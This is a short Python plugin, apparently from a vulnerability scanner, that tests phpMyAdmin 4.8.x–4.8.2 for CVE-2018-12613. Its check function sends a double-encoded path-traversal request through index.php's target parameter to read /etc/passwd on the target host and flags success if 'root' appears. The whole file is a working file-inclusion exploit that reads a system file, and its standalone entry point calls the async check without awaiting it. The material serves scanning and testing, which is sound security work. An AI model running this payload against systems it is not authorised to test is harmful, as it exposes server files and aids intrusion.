#!/usr/bin/env python3

from app.lib.common import get_useragent
from app.lib.request import request

class CVE_2018_12613_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'CVE-2018-12613文件包含漏洞',
            'description': 'CVE-2018-12613文件包含漏洞,影响范围为: phpMyAdmin 4.8.x-4.8.2',
            'date': '2018-06-21',
            'exptype': 'check',
            'type': 'File Include'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.headers = {
            'User-Agent': get_useragent()
        }

    async def check(self):
        
        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """
        
        url  = self.url + "/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd"
        try:
            req = await request.get(url, headers = self.headers)
            if req.status == 200 and 'phpMyAdmin' in req.headers['Set-Cookie'] and 'root' in await req.text():
                # print('存在CVE-2018-12613漏洞,结果是:', await req.text())
                return True
        except Exception as e:
            # print(e)
            pass

if __name__ == '__main__':
    CVE_2018_12613 = CVE_2018_12613_BaseVerify('http://127.0.0.1:8080')
    CVE_2018_12613.check()